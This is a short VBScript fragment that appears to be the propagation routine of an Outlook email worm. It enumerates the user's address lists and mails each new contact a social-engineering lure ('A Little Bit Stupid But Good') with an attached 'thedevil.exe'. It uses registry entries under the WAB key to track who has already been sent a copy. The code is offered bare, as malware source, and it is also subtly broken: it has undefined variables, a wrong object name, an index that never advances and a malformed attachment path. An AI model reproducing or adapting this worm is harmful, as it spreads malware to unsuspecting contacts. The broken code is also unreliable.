On Error Resume Next
Dim q, strAddress, strLists, ctrentries, malead, b, objRegEdit, regv, regad
Set objRegEdit = CreateObject("WScript.Shell")
Set objOutlook = WScript.CreateObject("Outlook.Application")
Set objMapi = objOutlook.GetNameSpace("MAPI")
For strLists = 1 To objMapi.AddressLists.Count
Set strAddress = objMapi.AddressLists(ctrlists)
q = 1
regv = regedit.RegRead("HKEY_CURRENT_USER\Software\Microsoft\WAB\ "&strAddress)
If (regv = "") Then
regv = 1
End If
if (int(strAddress.AddressEntries.Count)>int(regv)) then
For ctrentries = 1 To strAddress.AddressEntries.Count
malead = strAddress.AddressEntries(q)
regad = ""
regad = regedit.RegRead("HKEY_CURRENT_USER\Software\Microsoft\WAB\"&malead)
If (regad = "") Then
Set male = objOutlook.CreateItem(0)
male.Recipients.Add (malead)
male.Subject = "A Little Bit Stupid But Good"
male.Body = "Check This Out. Probably The Most Stupidest Thing I Ever Seen"
male.Attachments.Add(dirsystem"&\thedevil.exe")
male.Send
regedit.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\WAB\"&malead, 1, "REG_DWORD"
End If
x = x + 1
Next
regedit.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\WAB\"&strAddress,strAddress.AddressEntries.Count
Else
regedit.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\WAB\"&strAddress,strAddress.AddressEntries.Count
End If
Next
Set objOutlook = Nothing
Set objMapi = Nothing
